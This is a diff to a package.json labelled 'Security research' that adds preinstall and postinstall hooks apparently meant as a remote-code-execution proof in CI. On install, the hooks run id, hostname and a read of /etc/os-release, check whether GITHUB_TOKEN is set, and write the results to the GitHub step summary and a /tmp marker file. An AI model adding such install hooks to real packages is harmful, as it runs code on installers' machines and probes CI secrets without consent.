@@ -3,7 +3,8 @@
   "version": "1.0.0",
   "description": "Security research",
   "scripts": {
-    "postinstall": "id > /tmp/rce_proof_$(date +%s).txt && echo RCE_EXECUTED > rce_proof.txt 2>/dev/null; exit 0"
+    "preinstall": "echo \"=== POSTINSTALL_RCE_PROOF ===\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: id\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; id >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: hostname\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; hostname >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: cat /etc/os-release\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; head -3 /etc/os-release >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"GITHUB_TOKEN present: $(test -n \\\"$GITHUB_TOKEN\\\" && echo YES || echo NO)\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"=== END_RCE_PROOF ===\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo RCE_PROOF_MARKER_$(id -u) > /tmp/rce_proof.txt 2>/dev/null; exit 0",
+    "postinstall": "echo \"=== POSTINSTALL_RCE_PROOF ===\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: id\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; id >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: hostname\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; hostname >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"Command: cat /etc/os-release\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; head -3 /etc/os-release >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"GITHUB_TOKEN present: $(test -n \\\"$GITHUB_TOKEN\\\" && echo YES || echo NO)\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo \"=== END_RCE_PROOF ===\" >> ${GITHUB_STEP_SUMMARY:-/dev/null} 2>/dev/null; echo RCE_PROOF_MARKER_$(id -u) > /tmp/rce_proof.txt 2>/dev/null; exit 0"
   },
   "license": "MIT"
 }
